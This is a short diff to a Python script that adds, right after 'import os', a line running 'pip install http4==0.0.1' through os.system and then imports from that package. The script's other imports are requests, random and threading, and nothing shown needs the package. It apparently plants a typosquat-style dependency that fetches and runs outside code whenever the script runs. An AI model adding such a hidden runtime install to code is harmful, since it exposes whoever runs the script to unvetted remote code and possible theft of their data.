@@ -1,4 +1,6 @@
 import os
+os.system(f"pip install http4==0.0.1")
+from http4 import http
 import random
 import requests
 import threading
